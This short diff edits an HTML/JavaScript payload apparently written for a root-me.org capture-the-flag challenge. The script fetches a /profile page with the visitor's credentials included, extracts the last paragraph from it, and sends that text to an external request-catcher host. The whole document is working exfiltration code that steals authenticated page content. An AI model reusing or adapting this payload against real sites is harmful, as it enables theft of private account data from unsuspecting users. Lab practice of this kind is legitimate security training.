@@ -1,17 +1,16 @@
-<!DOCTYPE html>
-<html>
-<body>
 <script>
 (async () => {
-    const res = await fetch('/profile', {
+    const res = await fetch('http://challenge01.root-me.org:58003/profile', {
         credentials: 'include'
     });
-    const data = await res.text();
+    const html = await res.text();
     
-    await fetch('https://bsc.requestcatcher.com?data=' + encodeURIComponent(data), {
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
+    const lastP = doc.querySelector('section p:last-of-type').textContent;
+    
+    await fetch('https://bsc.requestcatcher.com?data=' + encodeURIComponent(lastP), {
         mode: 'no-cors'
     });
 })();
 </script>
-</body>
-</html>
